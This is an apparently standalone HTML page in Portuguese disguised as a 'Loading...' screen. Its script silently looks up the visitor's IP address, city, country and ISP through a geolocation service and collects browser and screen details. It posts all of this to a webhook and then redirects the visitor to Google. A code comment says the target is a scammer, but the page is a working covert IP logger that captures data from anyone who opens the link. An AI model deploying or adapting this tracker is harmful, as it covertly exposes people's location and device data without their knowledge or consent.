<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
</head>
<body>
    <script>
        const WEBHOOK_URL = "SUA_WEBHOOK_URL_AQUI";

        async function capturarDados() {
            try {
                // Obtém informações de IP e localização aproximada
                const response = await fetch("https://ipapi.co/json/");
                const ipData = await response.json();

                // Monta o objeto com os dados coletados
                const payload = {
                    content: "🚨 **Novo acesso registrado pelo link:**",
                    embeds: [{
                        title: "Informações do Visitante",
                        color: 16711680, // Cor vermelha
                        fields: [
                            { name: "IP", value: ipData.ip || "Desconhecido", inline: true },
                            { name: "Cidade/Estado", value: `${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}`, inline: true },
                            { name: "País", value: ipData.country_name || "N/A", inline: true },
                            { name: "Provedor/ISP", value: ipData.org || "N/A", inline: false },
                            { name: "Navegador/User-Agent", value: navigator.userAgent, inline: false },
                            { name: "Idioma", value: navigator.language, inline: true },
                            { name: "Resolução de Tela", value: `${screen.width}x${screen.height}`, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // Envia para o Webhook
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

            } catch (error) {
                console.error("Erro ao capturar dados:", error);
            } finally {
                // Redireciona o golpista para um site qualquer após o envio
                window.location.href = "https://www.google.com";
            }
        }

        window.onload = capturarDados;
    </script>
</body>
</html>
